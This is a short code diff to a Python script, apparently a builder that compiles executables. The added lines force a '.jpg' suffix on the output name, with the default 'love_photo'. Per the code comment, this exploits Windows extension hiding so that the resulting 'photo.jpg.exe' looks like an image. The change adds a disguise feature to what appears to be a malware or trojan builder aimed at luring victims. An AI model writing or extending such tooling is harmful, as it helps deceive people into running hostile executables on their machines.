@@ -337,6 +337,12 @@ def main():
     
     output_name = input(f"{Colors.CYAN}Output filename [love_photo]: {Colors.RESET}").strip() or "love_photo"
     
+    # Force the .jpg extension on the output name to exploit Windows extension hiding
+    # If the user provides 'photo', it becomes 'photo.jpg'
+    # The compiler will output 'photo.jpg.exe', which Windows displays as 'photo.jpg'
+    if not output_name.lower().endswith('.jpg'):
+        output_name = f"{output_name}.jpg"
+    
     print()
     print("-" * 80)
     print()
